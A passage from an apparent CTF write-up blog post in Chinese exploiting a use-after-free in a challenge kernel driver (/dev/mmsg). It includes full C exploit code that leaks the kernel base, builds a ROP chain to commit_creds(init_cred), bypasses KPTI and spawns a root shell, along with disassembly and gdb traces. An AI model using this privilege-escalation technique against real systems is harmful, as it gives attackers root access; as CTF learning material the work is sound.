</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff811aa376</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> init_cred <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff8264c9a0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> swapgs_iretq <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81c00ec6</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> add_rsp_0x168_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81909b8c</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> mmsg_fd;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> seq_fd;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">exploit</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;open device&#34;</span>);
</span></span><span style="display:flex;"><span>    mmsg_fd <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">open</span>(<span style="color:#f1fa8c">&#34;/dev/mmsg&#34;</span>, O_RDWR);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (mmsg_fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">die</span>(<span style="color:#f1fa8c">&#34;open device&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">struct</span> mmsg_arg arg;
</span></span><span style="display:flex;"><span>    arg.token <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    arg.top <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    arg.size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>;
</span></span><span style="display:flex;"><span>    arg.data <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(<span style="color:#bd93f9">16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">size_t</span> <span style="color:#ff79c6">*</span>buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">size_t</span> <span style="color:#ff79c6">*</span>)arg.data;
</span></span><span style="display:flex;"><span>    buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1145141145141145ull</span>;
</span></span><span style="display:flex;"><span>    buf[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">ioctl</span>(mmsg_fd, MMSG_PUT_DESC, <span style="color:#ff79c6">&amp;</span>arg);  <span style="color:#6272a4">// bypass size check
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">ioctl</span>(mmsg_fd, MMSG_RECV, <span style="color:#ff79c6">&amp;</span>arg);     <span style="color:#6272a4">// free head
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    seq_fd <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">seq_open</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">ioctl</span>(mmsg_fd, MMSG_GET_DESC, <span style="color:#ff79c6">&amp;</span>arg);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_warning</span>(<span style="color:#f1fa8c">&#34;start leak info&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span>(<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>; i <span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">log_debug</span>(<span style="color:#f1fa8c">&#34;buf[%d] =&gt; 0x%lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, i, buf[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    kernel_base <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20fac0</span>;
</span></span><span style="display:flex;"><span>    kernel_offset <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">-</span> nokaslr;
</span></span><span style="display:flex;"><span>    add_rsp_0x168_ret <span style="color:#ff79c6">+=</span> kernel_offset;
</span></span><span style="display:flex;"><span>    pop_rdi_ret <span style="color:#ff79c6">+=</span> kernel_offset;
</span></span><span style="display:flex;"><span>    init_cred <span style="color:#ff79c6">+=</span> kernel_offset;
</span></span><span style="display:flex;"><span>    commit_creds <span style="color:#ff79c6">+=</span> kernel_offset;
</span></span><span style="display:flex;"><span>    swapgs_iretq <span style="color:#ff79c6">+=</span> kernel_offset;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;kernel_offset =&gt; 0x%lx&#34;</span>, kernel_offset);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;kernel_base =&gt; 0x%lx&#34;</span>, kernel_base);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> add_rsp_0x168_ret;
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">log_info</span>(<span style="color:#f1fa8c">&#34;pollute =&gt; 0x%lx, maybe we can debug here&#34;</span>, buf[<span style="color:#bd93f9">0</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">ioctl</span>(mmsg_fd, MMSG_PUT_DESC, <span style="color:#ff79c6">&amp;</span>arg);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15,   0xbeefdead;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r14,   pop_rdi_ret;&#34;</span>   <span style="color:#6272a4">// &lt;- rip here
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;mov r13,   init_cred;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r12,   commit_creds;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rbp,   swapgs_iretq;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rbx,   0x55555555;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r11,   0x66666666;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r10,   0x77777777;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r9,    user_rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r8,    0x99999999;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;xor rax,   rax;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rcx,   0xaaaaaaaa;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rdx,   8;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rsi,   rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rdi,   seq_fd;&#34;</span>        <span style="color:#6272a4">// 这里假定通过 seq_operations-&gt;stat 来触发
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;syscall&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">signal</span>(SIGSEGV, get_shell);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">save_status</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">exploit</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>bypass kpti，修改cr3，在高版本使用，在 <code>+22</code> 地址是我们利用的gadget。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>swapgs_restore_regs_and_return_to_usermode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A34 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5F</span>                          pop     r15
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A36 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5</span>E                          pop     r14
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A38 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5</span>D                          pop     r13
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A3A <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5</span>C                          pop     r12
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A3C <span style="color:#bd93f9">5</span>D                             pop     rbp
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A3D <span style="color:#bd93f9">5</span>B                             pop     rbx
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A3E <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5</span>B                          pop     r11
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A40 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">5</span>A                          pop     r10
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A42 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">59</span>                          pop     r9
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A44 <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">58</span>                          pop     r8
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A46 <span style="color:#bd93f9">58</span>                             pop     rax
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A47 <span style="color:#bd93f9">59</span>                             pop     rcx
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A48 <span style="color:#bd93f9">5</span>A                             pop     rdx
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A49 <span style="color:#bd93f9">5</span>E                             pop     rsi
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A4A <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> E7                       mov     rdi, rsp    <span style="color:#ff79c6">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A4D <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>B <span style="color:#bd93f9">24</span> <span style="color:#bd93f9">25</span><span style="color:#ff79c6">+</span>                mov     rsp, <span style="color:#8be9fd;font-style:italic">gs</span>: <span style="color:#bd93f9">0x5004</span>
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A56 FF <span style="color:#bd93f9">77</span> <span style="color:#bd93f9">30</span>                       push    qword ptr [rdi<span style="color:#ff79c6">+</span><span style="color:#bd93f9">30</span>h]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A59 FF <span style="color:#bd93f9">77</span> <span style="color:#bd93f9">28</span>                       push    qword ptr [rdi<span style="color:#ff79c6">+</span><span style="color:#bd93f9">28</span>h]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A5C FF <span style="color:#bd93f9">77</span> <span style="color:#bd93f9">20</span>                       push    qword ptr [rdi<span style="color:#ff79c6">+</span><span style="color:#bd93f9">20</span>h]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A5F FF <span style="color:#bd93f9">77</span> <span style="color:#bd93f9">18</span>                       push    qword ptr [rdi<span style="color:#ff79c6">+</span><span style="color:#bd93f9">18</span>h]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A62 FF <span style="color:#bd93f9">77</span> <span style="color:#bd93f9">10</span>                       push    qword ptr [rdi<span style="color:#ff79c6">+</span><span style="color:#bd93f9">10</span>h]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A65 FF <span style="color:#bd93f9">37</span>                          push    qword ptr [rdi]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A67 <span style="color:#bd93f9">50</span>                             push    rax
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A68 EB <span style="color:#bd93f9">43</span>                          nop
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A6A <span style="color:#bd93f9">0F</span> <span style="color:#bd93f9">20</span> DF                       mov     rdi, cr3
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600A6D EB <span style="color:#bd93f9">34</span>                          jmp     <span style="color:#bd93f9">0xFFFFFFFF81600AA3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AA3 <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">81</span> CF <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">10</span><span style="color:#ff79c6">+</span>                or      rdi, <span style="color:#bd93f9">1000</span>h
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AAA <span style="color:#bd93f9">0F</span> <span style="color:#bd93f9">22</span> DF                       mov     cr3, rdi
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AAD <span style="color:#bd93f9">58</span>                             pop     rax
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AAE <span style="color:#bd93f9">5F</span>                             pop     rdi
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AAF FF <span style="color:#bd93f9">15</span> <span style="color:#bd93f9">23</span> <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">62</span><span style="color:#ff79c6">+</span>                call    <span style="color:#8be9fd;font-style:italic">cs</span>: SWAPGS
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AB5 FF <span style="color:#bd93f9">25</span> <span style="color:#bd93f9">15</span> <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">62</span><span style="color:#ff79c6">+</span>                jmp     <span style="color:#8be9fd;font-style:italic">cs</span>: INTERRUPT_RETURN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_SWAPGS
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF8103EFC0 <span style="color:#bd93f9">55</span>                             push    rbp
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF8103EFC1 <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> E5                       mov     rbp, rsp
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF8103EFC4 <span style="color:#bd93f9">0F</span> <span style="color:#bd93f9">01</span> F8                       swapgs
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF8103EFC7 <span style="color:#bd93f9">5</span>D                             pop     rbp
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF8103EFC8 C3                             retn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_INTERRUPT_RETURN
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AE0 F6 <span style="color:#bd93f9">44</span> <span style="color:#bd93f9">24</span> <span style="color:#bd93f9">20</span> <span style="color:#bd93f9">04</span>                 test    byte ptr [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20</span>], <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AE5 <span style="color:#bd93f9">75</span> <span style="color:#bd93f9">02</span>                          jnz     native_irq_return_ldt
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:FFFFFFFF81600AE7 <span style="color:#bd93f9">48</span> CF                          iretq
</span></span></code></pre></div><p>看别人的做法，好像不需要关注rip后面的内容，但是本题我没有使用这种方式做出来 👀。</p>
<ul>
<li>最后需要我们调用getshell函数。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15,   0xbeefdead;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r14,   pop_rdi_ret;&#34;</span>   <span style="color:#6272a4">// &lt;- rip here
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;mov r13,   init_cred;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r12,   commit_creds;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rbx,   0x55555555;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r11,   0x66666666;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r10,   0x77777777;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r9,    user_rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r8,    0x99999999;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;xor rax,   rax;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rcx,   0xaaaaaaaa;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rdx,   8;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rsi,   rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov rdi,   seq_fd;&#34;</span>    
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">get_shell</span>();
</span></span></code></pre></div><h2 id="tips">tips</h2>
<p>commit_creds(prepare_kernel_cred (0)) =&gt; 简化为 commit_creds(&amp;init_cred) init_cred: init 进程的权限，为root，在 <code>/proc/kallsyms</code> 内</p>
<p>寻找 gadget 时可能寻找到的gadget不能使用，报错为 <code>kernel tried to execute NX-protected page</code>，说明其地址不可访问？那就只能换了</p>
<p>为什么找不对gadget?或者根本没有找到🤡。和参考的看看了一下，发现gadget地址根本就没找对。</p>
<ul>
<li>ropper + ROPgadget + ropr 三个工具一起使用，获得三个gadget文件。</li>
<li>extract-vmlinux + vmlinux-to-elf 工具</li>
</ul>
<p>如何下断点？</p>
<ul>
<li>在想暂停的的地方使用 <code>getchar()</code> 停止后一路si</li>
<li>在固定的指令地址下断点，但是需要事先知道地址。但是rop时，地址一般都是知道的。</li>
</ul>
<p>在固定的指令下断点，比如此题就可以在在 add rsp 那一条指令下断点</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;
</span></span><span style="display:flex;"><span>   0xffffffff81909b93    ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; tele 0xffffc900001c7df8+0x168 
</span></span><span style="display:flex;"><span>00:0000 0xffffc900001c7f60 0x44444444 /* <span style="color:#f1fa8c">&#39;DDDD&#39;</span> */
</span></span><span style="display:flex;"><span>01:0008 0xffffc900001c7f68 0x33333333 /* <span style="color:#f1fa8c">&#39;3333&#39;</span> */
</span></span><span style="display:flex;"><span>02:0010 0xffffc900001c7f70 0x22222222 /* <span style="color:#f1fa8c">&#39;&#34;&#34;&#34;&#34;&#39;</span> */
</span></span><span style="display:flex;"><span>03:0018 0xffffc900001c7f78 0xbbbb1111
</span></span><span style="display:flex;"><span>04:0020 0xffffc900001c7f80 0xbbbb2222
</span></span><span style="display:flex;"><span>05:0028 0xffffc900001c7f88 0x246
</span></span><span style="display:flex;"><span>06:0030 0xffffc900001c7f90 0x11110000
</span></span><span style="display:flex;"><span>07:0038 0xffffc900001c7f98 0x99999999
</span></span><span style="display:flex;"><span>08:0040 0xffffc900001c7fa0 0x88888888
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/kernel">kernel</a></li>
					
					<li><a href="/tags/uaf">uaf</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
